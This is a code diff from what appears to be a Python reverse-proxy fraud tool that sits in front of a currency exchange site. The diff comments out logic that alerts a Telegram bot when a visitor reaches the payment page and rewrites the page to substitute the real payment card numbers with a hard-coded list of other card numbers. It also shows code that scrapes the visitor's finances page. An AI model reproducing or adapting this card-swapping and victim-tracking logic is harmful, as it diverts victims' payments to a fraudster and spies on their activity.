@@ -231,15 +231,15 @@ def proxy(path):
             flag = True
 
 
-        if request.path.startswith('/exchange') and 'amount' in request.args:  # or 'order' in request.path.split('/')
-            bot.send_message(user_id, f'Вход на страницу оплаты {request.args["amount"]}')
-            respon_text = change_card(respon_text, cards=['2200 7008 3501 0140', '2200 7008 4750 7141', '2200 7008 4155 6292', '2200 7008 4890 9783', '2200 7008 4271 4643'])
-            flag = True
+        # if request.path.startswith('/exchange') and 'amount' in request.args:  # or 'order' in request.path.split('/')
+        #     bot.send_message(user_id, f'Вход на страницу оплаты {request.args["amount"]}')
+        #     respon_text = change_card(respon_text, cards=['2200 7008 3501 0140', '2200 7008 4750 7141', '2200 7008 4155 6292', '2200 7008 4890 9783', '2200 7008 4271 4643'])
+        #     flag = True
 
-        if ('exchange' in request.path) and ('order' in request.path) and ('my' not in request.path):
-            bot.send_message(user_id, f'Вход на страницу оплаты')
-            respon_text = change_only_card(respon_text)
-            flag = True
+        # if ('exchange' in request.path) and ('order' in request.path) and ('my' not in request.path):
+        #     bot.send_message(user_id, f'Вход на страницу оплаты')
+        #     respon_text = change_only_card(respon_text)
+        #     flag = True
 
         if path == '/profile/finances/':
             bs = BeautifulSoup(response.text, 'lxml')
